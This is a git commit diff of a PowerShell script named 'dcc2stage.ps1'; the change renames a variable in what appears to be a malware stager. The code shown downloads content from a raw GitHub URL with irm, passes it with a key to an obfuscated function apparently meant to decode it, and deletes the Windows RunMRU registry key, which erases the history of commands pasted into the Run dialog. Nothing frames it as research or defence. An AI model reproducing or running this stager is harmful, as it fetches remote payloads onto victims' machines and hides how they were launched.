723b6ffef439deffedbaf33b534f0248527305e6
Bongman1234 <164390870+Bongman1234@users.noreply.github.com>
2025-05-18 18:30:07 +0100

    Update dcc2stage.ps1

--- dcc2stage.ps1
+++ dcc2stage.ps1
@@ -10,9 +10,9 @@
     }
     return $accent
 }
-$sauce = "$sauce"
+$k = "$k"
 $mirrage = irm "https://raw.githubusercontent.com/Bongman1234/assets/main/y6rhf4w"
-$triphook = cappybara -sec $mirrage -bty $sauce
+$triphook = cappybara -sec $mirrage -bty $k
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
